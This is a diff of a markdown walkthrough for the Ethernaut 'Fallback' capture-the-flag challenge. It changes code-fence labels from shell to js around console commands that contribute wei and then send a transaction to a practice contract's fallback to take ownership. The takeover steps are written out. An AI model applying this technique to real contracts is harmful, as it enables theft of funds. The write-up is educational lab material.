@@ -57,20 +57,20 @@ Challenge wants us to own the contract and withdraw all contribution from the co
 
 Who is owner?
 
-```shell
+```js
 await contract.owner()
 "0x9CB391dbcD447E645D6Cb55dE6ca23164130D008"
 ```
 The first thing to solve this challenge is contribute some wei.
 
-```shell
+```js
 await contract.contribute({value: 4})
 ```
 This notification met me.
 
 <img src="https://github.com/wasny0ps/Ethernaut-Challenges/blob/main/Challenges/Fallback/img/contribute.png">
 
-```shell
+```js
 await contract.getContribution()
 Object { negative: 0, words: (2) […], length: 1, red: null }
 ​
@@ -100,12 +100,12 @@ RPCs are coded as though they were just local procedure calls. In other words, a
 
 For the call receiving function, we use JSON RPC with the ``sendTransaction()`` method and enter the value that will make us the owner of the contract.
 
-```shell
+```js
 await contract.sendTransaction({value: 1})
 ```
 Check owner.
 
-```shell
+```js
 await contract.owner()
 "0x0C39eb3D6C0583AdA92e15C9e7610B609BBdF35b"
 
